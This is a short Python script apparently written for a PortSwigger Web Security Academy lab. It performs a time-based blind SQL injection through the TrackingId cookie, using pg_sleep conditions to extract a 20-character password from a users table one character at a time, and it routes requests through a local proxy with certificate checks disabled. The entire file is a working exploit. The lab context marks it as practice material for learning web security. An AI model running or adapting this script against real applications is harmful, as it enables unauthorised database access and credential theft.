import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


url = "https://0a4000da0408932c802f80e600b20010.web-security-academy.net/filter?category=Gifts"

chars="abcdefghijklmnopqrstuvwxyz0123456789"
password=[]

# payload="' and (select case when length(password)=20 then pg_sleep(3) else pg_sleep(0) end from users limit 1) is not NULL--"

# r=requests.get(url,cookies={"TrackingId":f"ZjCkDCP815ZVNRWk{payload}","session":"E7T3tLsw8ksbPQZ2wzmxjqocK9SVGTPn"},proxies=proxies,verify=False,timeout=10)

# if r.elapsed.total_seconds()>3:
#     print("Password length is 20")


sum=0
for index in range(1,21):
    sum+=1
    print(sum)
    for c in chars:
        payload=f"' and (select case when substr(password,{index},1)='{c}' then pg_sleep(3) else pg_sleep(0) end from users limit 1) is not NULL--"

        r = requests.get(url, cookies={"TrackingId":f"wW5i876igizsvood{payload}", "session":"vt6Ivom8ttakN2jXzr3tEBYhqR7prB3v"}, proxies=proxies, verify=False, timeout=10)

        if r.elapsed.total_seconds()>3:
            password.append(c)
            break


print("".join(password))